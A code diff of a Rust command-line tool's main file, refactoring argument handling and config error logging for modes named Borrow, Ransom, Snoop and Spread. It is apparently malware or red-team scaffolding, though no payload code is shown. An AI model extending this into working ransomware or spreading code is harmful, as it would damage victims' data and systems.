@@ -1,7 +1,7 @@
 use clap::{Parser, Subcommand};
 use config::{Config, ConfigError, FileFormat};
 use env_logger::{fmt::Target, Builder};
-use log::{debug, error, info, log_enabled, warn, Level, LevelFilter};
+use log::{error, info, warn, Level};
 use std::{io::Write, path::PathBuf};
 
 mod borrow;
@@ -53,7 +53,7 @@ enum Modes {
 
 fn main() {
     // get user input
-    let cli = Cli::parse();
+    let mut cli = Cli::parse();
 
     // set up logging
     let mut builder = Builder::from_default_env();
@@ -98,16 +98,15 @@ fn main() {
     // run the user specified mode
     if let Some(mode) = cli.mode {
         match mode {
-            Modes::Borrow => borrow(get_exe(&conf), get_exearg(&conf)),
+            Modes::Borrow => borrow(get_exe(&conf), get_exeargs(&conf)),
             Modes::Ransom => ransom(&get_root(&conf), &get_catcher(&conf)),
             Modes::Snoop => snoop(),
             Modes::Spread => spread(),
             Modes::DumpConfig => dumpconf(conf),
             // _ => unreachable!(), // panics if code becomes not unreachable
         }
-    } else {
-        warn!("no mode specified");
     }
+
     info!("finished!");
 }
 
@@ -132,8 +131,16 @@ fn get_field<'de, T>(field: &str, config: &Option<Config>) -> Option<T>
 where
     T: serde::de::Deserialize<'de>,
 {
+    // try to read the config
     if let Some(conf) = config {
-        conf.get::<T>(field).ok()
+        // query for field in config
+        match conf.get::<T>(field) {
+            Ok(t) => Some(t),
+            Err(e) => {
+                error!("{e:?}");
+                None
+            }
+        }
     } else {
         error!("could not find {field} in config");
         None
@@ -164,6 +171,6 @@ fn get_exe(conf: &Option<Config>) -> PathBuf {
     }
 }
 
-fn get_exearg(conf: &Option<Config>) -> Option<String> {
-    get_field("exearg", conf)
+fn get_exeargs(conf: &Option<Config>) -> Option<Vec<String>> {
+    get_field("exeargs", conf)
 }
